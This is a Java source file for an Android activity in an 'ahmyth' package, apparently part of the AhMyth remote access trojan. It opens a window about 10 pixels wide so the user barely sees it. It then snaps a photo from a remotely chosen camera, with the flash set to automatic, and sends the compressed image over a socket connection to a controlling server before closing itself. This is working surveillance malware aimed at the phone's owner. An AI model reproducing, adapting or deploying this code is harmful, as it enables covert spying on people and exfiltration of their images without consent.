package ahmyth.mine.king.ahmyth;


import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.ImageView;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;


/**
 * Created by Administrator on 2018/1/7.
 */

public class CameraActivity extends Activity {
    private static CameraActivity instance;
    private SurfaceView mSurfaceView;
    private SurfaceHolder mSurfaceHolder;
    private ImageView iv_show;
    private CameraManager mCameraManager;//摄像头管理器
    private Handler childHandler, mainHandler;
    private String mCameraID;//摄像头Id 0 为后  1 为前
    private ImageReader mImageReader;
    private CameraCaptureSession mCameraCaptureSession;
    private CameraDevice mCameraDevice;
    private void getCameraID(String cameraID){
        this.mCameraID = cameraID;
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.height = 10;
        params.width = 10;
        window.setAttributes(params);
        instance = this;
        setContentView(R.layout.surface_view_camera2_activity);
        Bundle bundle = this.getIntent().getExtras();
        //接收name值
        String cameraID = bundle.getString("cameraID");
        getCameraID(cameraID);
        initView();
    }
    /**
     * 初始化Camera2
     */
    private void initCamera2() {

        HandlerThread handlerThread = new HandlerThread("Camera2");
        handlerThread.start();
        childHandler = new Handler(handlerThread.getLooper());
        mainHandler = new Handler(getMainLooper());

        mImageReader = ImageReader.newInstance(1080, 1920, ImageFormat.JPEG,1);
        mImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() { //可以在这里处理拍照得到的临时照片 例如，写入本地
            @Override
            public void onImageAvailable(ImageReader reader) {
                mCameraDevice.close();
                mSurfaceView.setVisibility(View.GONE);
                iv_show.setVisibility(View.VISIBLE);
                // 拿到拍照照片数据
                Image image = reader.acquireNextImage();
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);//由缓冲区存入字节数组
                final Bitmap bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                if (bitmap != null) {
                    try{
                        ByteArrayOutputStream bos = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);
                        JSONObject object = new JSONObject();
                        object.put("image",true);
                        object.put("buffer" , bos.toByteArray());
                        IOSocket.getInstance().getIoSocket().emit("x0000ca" , object);
                    }
                    catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
                CameraActivity.killCameraActivity();
            }
        }, mainHandler);
        //获取摄像头管理
        mCameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            //打开摄像头
            Log.d("Debug","openCamera");
            mCameraManager.openCamera(mCameraID, stateCallback, mainHandler);
        } catch (CameraAccessException e) {
            Log.d("Debug","permission failed");
            e.printStackTrace();
        }
    }
    /**
     * 摄像头创建监听
     */
    private CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(CameraDevice camera) {//打开摄像头
            mCameraDevice = camera;
            //开启预览
            Log.d("Debug","takePreview");
            takePreview();
            Log.d("Debug","takePicture");
            takePicture();
        }

        @Override
        public void onDisconnected(CameraDevice camera) {//关闭摄像头
            if (null != mCameraDevice) {
                mCameraDevice.close();
                CameraActivity.this.mCameraDevice = null;
            }
        }

        @Override
        public void onError(CameraDevice camera, int error) {//发生错误
            Log.d("Debug","errorCamera");
        }
    };

    /**
     * 开始预览
     */
    private void takePreview() {
        try {
            // 创建预览需要的CaptureRequest.Builder
            final CaptureRequest.Builder previewRequestBuilder = mCameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            // 将SurfaceView的surface作为CaptureRequest.Builder的目标
            previewRequestBuilder.addTarget(mSurfaceHolder.getSurface());
            // 创建CameraCaptureSession，该对象负责管理处理预览请求和拍照请求
            mCameraDevice.createCaptureSession(Arrays.asList(mSurfaceHolder.getSurface(), mImageReader.getSurface()), new CameraCaptureSession.StateCallback() // ③
            {
                @Override
                public void onConfigured(CameraCaptureSession cameraCaptureSession) {
                    if (null == mCameraDevice) return;
                    // 当摄像头已经准备好时，开始显示预览
                    mCameraCaptureSession = cameraCaptureSession;
                    try {
                        // 自动对焦
                        previewRequestBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                        // 打开闪光灯
                        previewRequestBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
                        // 显示预览
                        CaptureRequest previewRequest = previewRequestBuilder.build();

                        mCameraCaptureSession.setRepeatingRequest(previewRequest, null, childHandler);
                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void onConfigureFailed(CameraCaptureSession cameraCaptureSession) {
                  Log.d("Debug","config error Camera");
                }
            }, childHandler);
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
    }
    /**
     * 拍照
     */
    private void takePicture() {
        if (mCameraDevice == null) return;
        // 创建拍照需要的CaptureRequest.Builder
        final CaptureRequest.Builder captureRequestBuilder;
        try {
            captureRequestBuilder = mCameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            // 将imageReader的surface作为CaptureRequest.Builder的目标
            captureRequestBuilder.addTarget(mImageReader.getSurface());
            // 自动对焦
            captureRequestBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            // 自动曝光
            captureRequestBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
            // 获取手机方向
            int rotation = getWindowManager().getDefaultDisplay().getRotation();
            // 根据设备方向计算设置照片的方向
            captureRequestBuilder.set(CaptureRequest.JPEG_ORIENTATION, rotation);
            //拍照
            CaptureRequest mCaptureRequest = captureRequestBuilder.build();
            mCameraCaptureSession.capture(mCaptureRequest, null, childHandler);
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
    }
    /**
     * 初始化
     */
    private void initView() {
        iv_show = (ImageView) findViewById(R.id.iv_show_camera2_activity);
        //mSurfaceView
        mSurfaceView = (SurfaceView) findViewById(R.id.surface_view_camera2_activity);
        mSurfaceHolder = mSurfaceView.getHolder();
        mSurfaceHolder.setKeepScreenOn(true);
        // mSurfaceView添加回调
        mSurfaceHolder.addCallback(new SurfaceHolder.Callback() {
            @Override
            public void surfaceCreated(SurfaceHolder holder) { //SurfaceView创建
                // 初始化Camera
                Log.d("Debug","initCamera2");
                initCamera2();
            }

            @Override
            public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
            }

            @Override
            public void surfaceDestroyed(SurfaceHolder holder) { //SurfaceView销毁
                // 释放Camera资源
                if (null != mCameraDevice) {
                    mCameraDevice.close();
                    CameraActivity.this.mCameraDevice = null;
                }
            }
        });

    }
    public static void startCameraActivity(String cameraID) {
        Intent intent = new Intent("cameraactivity");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        Bundle bundle=new Bundle();
        //传递name参数为tinyphp
        bundle.putString("cameraID", cameraID);
        intent.putExtras(bundle);
        Myapplication.getAppContext().startActivity(intent);
        Log.d("Ahmyth","Startcameraactivity");
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (null != mCameraDevice) {
            mCameraDevice.close();
            CameraActivity.this.mCameraDevice = null;
            instance = null;
        }
    }
    public static void killCameraActivity() {
        Log.d("Debug","instance"+instance);
        if(instance != null){
            instance.finish();
            Log.d("Ahmyth","killcameraActivity");
        }
    }
}
